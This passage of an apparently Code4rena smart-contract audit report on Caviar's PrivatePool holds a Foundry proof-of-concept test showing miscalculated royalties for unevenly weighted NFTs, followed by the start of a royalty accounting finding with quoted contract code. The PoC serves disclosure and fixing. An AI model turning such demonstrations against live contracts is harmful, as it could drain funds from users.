class=\"mtk1\">        </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">_setTokenRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reciever</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Then add this snippet to Fixture.sol:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">file: </span><span class=\"mtk12\">Fixture</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">GodsUnchained</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gu</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">GodsUnchained</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>Then add this snippet to token-weights.json:</p>\n<p>Changing the weights to represent the two NFT’s being bought in this case.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"json\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk7\">2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk7\">10</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">]</span></span></span></code></pre>\n<p>Lastly to test this, you need to add this test to Buy.t.sol:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// forge test --match-test test_unevenRoyalties --ffi</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_unevenRoyalties</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// arrange</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">PrivatePool</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyRegistry</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stolenNftOracle</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gu</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">12e18</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">feeRate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">generateMerkleRoot</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; owner of nft&#39;s</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xbeefbeef</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user2</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xfeebfeeb</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; mint and push nft&#39;s one is 1x one is 10x</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gu</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gu</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; set fees. 1% for one user, 10% for the other</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gu</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRoyaltyInfo</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">user1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gu</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRoyaltyInfo</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">user2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; set up</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proofs</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">generateMerkleProofs</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sumWeightsAndValidateProof</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">proofs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">, , ) = </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">buyQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weightSum</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; buy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buy</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">2</span><span class=\"mtk1\">}( </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">proofs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; assert that users got equal reserves. with different weights and royalty fees users should NOT be getting the same amount of royalties</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; the royalty fee of user2 is 10 times greater than user one. This shows that user2 is getting 10 times as much royaltys when user 2 should be getting 100 times as much as user one.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; user 1: 1% of 1 eth = 0.01 eth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; user 2: 10% of 10 eth = 1 eth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; 0.01 eth * 100 = 1eth.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//&gt; user 2 should be getting 100 times more royalties than user 1 but is only getting 10 times the amount.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>To address this issue, it is recommended that the weight of NFTs relative to other NFTs being purchased should be taken into consideration when calculating royalties.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/669#issuecomment-1518657766\">outdoteth (Caviar) acknowledged, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>It is commented in the code that it’s assumed all NFTs in the purchase are of the same price: <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L334\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L334</a></p>\n<p>Assuming that the recipient is the same for each NFTs royalty payment (which it almost always is in practice), then this makes sense.</p>\n<p>NFT 1 is worth 1 ETH<br>\nNFT 2 is worth 2 ETH&#x3C;</p>\n<p>(1 + 2) / 2 = 1.5 ETH<br>\n1 / 2 + 2 / 2 = 1.5 ETH</p>\n<p>The output is the same. The additional complexity of individually calculating each price is not worth it.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/669#issuecomment-1529055395\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I believe that the finding is valid because the EIP specifies that each NFT may have a different royalty, the contract is still fetching the specific royalty for each NFT id, leading me to believe that this will cause incorrect royalty payouts in specific cases in which a collection has different royalties based on the NFT id.</p>\n<p>As a developer, I agree with the Sponsor with a nofix and believe in practice that this should not be an issue.</p>\n<p>As a Judge, I believe the finding meets the requirements of improperly implementing an EIP, which can cause a loss of yield. For this reason I think Medium Severity to be appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-loss-of-funds-for-traders-due-to-accounting-error-in-royalty-calculations\" style=\"position:relative;\"><a href=\"#m-08-loss-of-funds-for-traders-due-to-accounting-error-in-royalty-calculations\" aria-label=\"m 08 loss of funds for traders due to accounting error in royalty calculations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/596\">[M-08] Loss of funds for traders due to accounting error in royalty calculations</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/596\">AkshaySrivastav</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/993\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/991\">bshramin</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/986\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/981\">saian</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/887\">0xRobocop</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/868\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/843\">Koolex</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/759\">tallo</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/712\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/654\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/643\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/606\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/365\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/334\">chaduke</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/177\">sashik_eth</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L281\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L281</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L328-L355\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L328-L355</a></p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The <code>PrivatePool.buy</code> and <code>PrivatePool.sell</code> functions intend to distribute royalty amount whenever NFTs are traded. The implementation of buy and sell looks like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">buy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MerkleMultiProof</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proof</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the sale price (assume it&#39;s the same for each NFT even if weights differ)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// transfer the NFT to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// get the royalty fee for the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">,) = </span><span class=\"mtk11\">_getRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// add the royalty fee to the total royalty fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span 